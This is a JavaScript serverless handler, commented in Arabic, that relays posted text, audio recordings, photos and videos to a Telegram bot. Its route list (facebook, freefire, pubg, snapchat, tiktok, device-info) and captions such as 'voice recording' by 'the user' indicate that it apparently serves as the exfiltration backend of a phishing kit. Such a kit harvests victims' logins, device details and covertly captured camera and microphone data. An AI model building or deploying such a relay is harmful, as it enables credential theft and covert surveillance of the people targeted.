export const config = { maxDuration: 60 };

const BOT_TOKEN = process.env.BOT_TOKEN;

export default async function handler(req, res) {
  if (!BOT_TOKEN) {
    return res.status(500).json({ success: false, error: "Bot token not configured" });
  }
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: "Method Not Allowed" });
  }

  // تحديد نوع العملية من المسار الأصلي
  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const path = url.pathname.toLowerCase();

  let action = 'message';
  if (path.includes('send-audio')) action = 'audio';
  else if (path.includes('send-photo') || path.includes('upload-photos')) action = 'photo';
  else if (path.includes('send-video')) action = 'video';
  // الباقي كله (device-info, facebook, freefire, internet, pubg,
  // send-message, snapchat, tiktok, telegram, sendTelegram) = message

  try {
    const body = req.body || {};

    // ============ 1) رسالة نصية ============
    if (action === 'message') {
      const { chatId, message, text } = body;
      const finalMessage = message || text; // يدعم الاتنين

      if (!chatId || !finalMessage) {
        return res.status(400).json({ success: false, error: "Missing chatId or message/text" });
      }

      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: finalMessage,
          parse_mode: 'HTML'
        })
      });
      const data = await r.json();
      if (!r.ok) {
        return res.status(500).json({ success: false, error: data.description || "Telegram error" });
      }
      return res.status(200).json({ success: true, data });
    }

    // ============ 2) صوت ============
    if (action === 'audio') {
      const { chatId, audio, filename } = body;
      if (!chatId || !audio) {
        return res.status(400).json({ success: false, error: "Missing chatId or audio" });
      }

      const blob = base64ToBlob(audio, 'audio/webm');

      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('audio', blob, filename || `audio_${Date.now()}.webm`);
      form.append('caption', `🎤 تسجيل صوتي\n⏰ ${new Date().toLocaleString('ar-EG')}`);
      form.append('title', 'تسجيل صوتي');
      form.append('performer', 'المستخدم');

      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
        method: 'POST',
        body: form
      });
      const data = await r.json();

      if (!r.ok) {
        // Fallback: sendDocument
        const form2 = new FormData();
        form2.append('chat_id', chatId);
        form2.append('document', blob, filename || `audio_${Date.now()}.webm`);
        form2.append('caption', `🎤 تسجيل صوتي\n⏰ ${new Date().toLocaleString('ar-EG')}`);

        const r2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: form2
        });
        const data2 = await r2.json();
        if (!r2.ok) {
          return res.status(500).json({ success: false, error: data.description || data2.description });
        }
        return res.status(200).json({ success: true, data: data2, sentAs: 'document' });
      }
      return res.status(200).json({ success: true, data });
    }

    // ============ 3) صورة ============
    if (action === 'photo') {
      const { chatId, photo, photoNumber, quality, filename } = body;
      if (!chatId || !photo) {
        return res.status(400).json({ success: false, error: "Missing chatId or photo" });
      }

      const blob = base64ToBlob(photo, 'image/jpeg');
      const name = filename || `photo_${photoNumber || Date.now()}.jpg`;

      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('photo', blob, name);
      let caption = `📸 صورة${photoNumber ? ' ' + photoNumber : ''}`;
      if (quality) caption += `\n✨ ${quality}`;
      caption += `\n⏰ ${new Date().toLocaleString('ar-EG')}`;
      form.append('caption', caption);

      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form
      });
      const data = await r.json();
      if (!r.ok) {
        return res.status(500).json({ success: false, error: data.description || "Telegram error" });
      }
      return res.status(200).json({ success: true, data });
    }

    // ============ 4) فيديو ============
    if (action === 'video') {
      const { chatId, video, filename } = body;
      if (!chatId || !video) {
        return res.status(400).json({ success: false, error: "Missing chatId or video" });
      }

      const blob = base64ToBlob(video, 'video/mp4');
      const name = filename || `video_${Date.now()}.mp4`;

      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('video', blob, name);
      form.append('caption', `🎥 فيديو\n⏰ ${new Date().toLocaleString('ar-EG')}`);
      form.append('supports_streaming', 'true');

      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
        method: 'POST',
        body: form
      });
      const data = await r.json();

      if (!r.ok) {
        // Fallback: sendDocument
        const form2 = new FormData();
        form2.append('chat_id', chatId);
        form2.append('document', blob, name);
        form2.append('caption', `🎥 فيديو\n⏰ ${new Date().toLocaleString('ar-EG')}`);

        const r2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: form2
        });
        const data2 = await r2.json();
        if (!r2.ok) {
          return res.status(500).json({ success: false, error: data.description || data2.description });
        }
        return res.status(200).json({ success: true, data: data2, sentAs: 'document' });
      }
      return res.status(200).json({ success: true, data });
    }

    return res.status(400).json({ success: false, error: "Unknown action" });

  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
}

// helper: Base64 → Blob
function base64ToBlob(base64, mime) {
  const byteChars = atob(base64);
  const byteNumbers = new Array(byteChars.length);
  for (let i = 0; i < byteChars.length; i++) {
    byteNumbers[i] = byteChars.charCodeAt(i);
  }
  return new Blob([new Uint8Array(byteNumbers)], { type: mime });
}
